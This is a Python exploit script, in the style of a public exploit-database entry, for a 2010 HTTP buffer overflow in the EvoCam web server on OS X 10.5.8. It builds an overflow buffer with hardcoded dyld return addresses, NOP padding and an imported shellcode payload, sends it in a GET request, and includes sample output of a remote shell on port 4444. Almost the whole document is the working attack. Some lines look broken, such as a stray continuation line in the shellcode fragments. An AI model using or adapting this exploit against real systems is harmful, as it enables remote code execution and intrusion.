#!/usr/bin/python

# Exploit Title: OS X EvoCam Web Server Buffer Overflow Exploit 3.6.6 and 3.6.7
# Date: 1st June 2010
# Author: d1dn0t ( didnot __A-T__ me.com )
# Software Link: http://www.pizza.org/evocam.dmg
# Version: EvoCam 3.6.6 and 3.6.7
# Tested on: OS X 10.5.8 Intel

import socket
import sys
import struct
from optparse import OptionParser

# OS X EvoCam Web Server Buffer Overflow Exploit 3.6.6 and 3.6.7
# Tested on Leopard 10.5.8 Intel
# Paul Harrington didnot __A-T__ me.com
#
#$ ./evocam.py -H 192.168.1.28 -P 8080 -T 2
#EvoLogical EvoCam 3.6.6/7 on OS X 10.5.8 Intel HTTP Buffer Overflow Exploit
#didnot __A-T__ me.com
#Targeting EvoCam Version 3.6.7
#[+] Sending evil buffer...
#[+] Done!
#[*] Check your shell at 192.168.1.28:4444
#$ nc -v 192.168.1.28 4444
#Connection to 192.168.1.28 4444 port [tcp/krb524] succeeded!
#uname -a
#Darwin Leopard-VM.local 9.8.0 Darwin Kernel Version 9.8.0: Wed Jul 15 16:55:01 PDT 2009; root:xnu-1228.15.4~1/RELEASE_I386 i386






import socket
from payload import buf
import sys
def shell_attack(target_machine, target_port):
     HOST = target_machine
     PORT = target_port
     BUFLEN=1560

# Settings for Leopard 10.5.8
     WRITEABLE = 0x8fe66448
     SETJMP = 0x8fe1cf38 #$ nm /usr/lib/dyld | grep "setjmp" #8fe1cf38 t _setjmp
     STRDUP = 0x8fe210dc #$ nm /usr/lib/dyld | grep "strdup" #8fe210dc t _strdup
     JMPEAX = 0x8fe01041 #0x8fe01041 <__dyld__dyld_start+49>: jmp *%eax

     NOP=b"\x90\x90"

     

     FRAG0 = "\x90" + "\x58" + "\x61" + "\xc3"
     FRAG1 = "\x90" + "\x58" + "\x89\xe0" + "\x83\xc0\x0e" + "\x89\x44\x24\x08"
     + "\xc3" # 0C is a bad character

     STUB = \
     FRAG0 + \
     struct.pack(b'<III',SETJMP,WRITEABLE+32,WRITEABLE) + \
     FRAG1 + \
     b'A'*20 +\
     struct.pack(b'<IIIII',SETJMP,WRITEABLE+24,WRITEABLE,STRDUP,JMPEAX) + \
     b'A'*4

     BUFFER = "A"*BUFLEN + STUB + NOP + buf

     s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((HOST,PORT))
     
     s.send("GET " +BUFFER + " HTTP/1.0\r\n\r\n")
    
     s.close()